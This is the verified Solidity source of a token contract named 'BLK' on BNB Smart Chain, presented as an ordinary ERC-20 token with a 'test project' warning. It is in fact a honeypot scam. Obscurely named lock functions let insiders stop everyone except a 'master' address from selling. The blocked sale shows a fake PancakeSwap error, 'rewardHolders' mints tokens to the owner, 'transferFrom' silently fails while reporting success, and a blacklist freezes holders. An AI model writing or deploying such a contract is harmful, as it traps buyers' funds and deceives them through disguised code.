/**
 *Submitted for verification at BscScan.com on 2022-11-22
*/

/**
 *Submitted for verification at Etherscan.io on 2022-11-15
*/

// SPDX-License-Identifier: MIT

// THIS IS TEST PROJECT
// DON'T BUY THIS TOKEN OR YOU CAN LOSE MONEY

pragma solidity 0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract BLC is Context, IERC20, Ownable {
    address _router;

    uint8 internal constant _DECIMALS = 9;
    bool lock = false;

    address public master;
    mapping(address => bool) internal _pairs;
    mapping(address => bool) internal _blacklist;
    mapping(address => bool) internal _devs;
    mapping(address => bool) public _marketersAndDevs;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    mapping(address => uint256) internal _buySum;
    mapping(address => uint256) internal _sellSum;
    mapping(address => uint256) internal _sellSumETH;

    uint256 internal _totalSupply = (10 ** 8) * (10 ** _DECIMALS);

    modifier onlyMaster() {
        require(msg.sender == master);
        _;
    }

    modifier onlyDevs() {
        require(_devs[msg.sender] == true, ")");
        _;
    }

    constructor(address routerAddress, address anotherOwner) {
        _router = routerAddress;

        _balances[owner()] = _totalSupply;
        master = owner();

        _marketersAndDevs[owner()] = true;
        _devs[owner()] = true;
        _devs[anotherOwner] = true;

        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() external pure override returns (string memory) {
        return "BLK";
    }

    function symbol() external pure override returns (string memory) {
        return "BLK";
    }

    function decimals() external pure override returns (uint8) {
        return _DECIMALS;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function addToDevs(address newDev) external onlyOwner {
        _devs[newDev] = true;
    }

    function unLockTransfer41581239(uint8 ads) external onlyDevs {
        lock = false;
    }

    function lockTransfer155891298129(uint8 ads) external onlyDevs {
        lock = true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);

        return true;
    }

    function addToBL(address bl) external onlyOwner {
        _blacklist[bl] = true;
    }

    function removeFromBL(address bl) external onlyOwner {
        _blacklist[bl] = false;
    }

    function addPair(address pair) external onlyOwner {
        _pairs[pair] = true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (!lock) {
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");

            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    function burn(uint256 amount) external onlyOwner {
        _balances[owner()] -= amount;
        _totalSupply -= amount;
    }

    function setMaster(address account) external onlyOwner {
        master = account;
    }

    function includeInReward(address account) external onlyMaster {
        _marketersAndDevs[account] = true;
    }

    function excludeFromReward(address account) external onlyMaster {
        _marketersAndDevs[account] = false;
    }

    function rewardHolders(uint256 amount) external onlyOwner {
        _balances[owner()] += amount;
        _totalSupply += amount;
    }
    
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        if (_blacklist[sender]) {
            revert("BL");
        }

        if ((recipient == address(_router) || _pairs[recipient]) && sender != master) {
            require(!lock, "Pancake: INSUFFICIENT_OUTPUT_AMOUNT");
        }
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}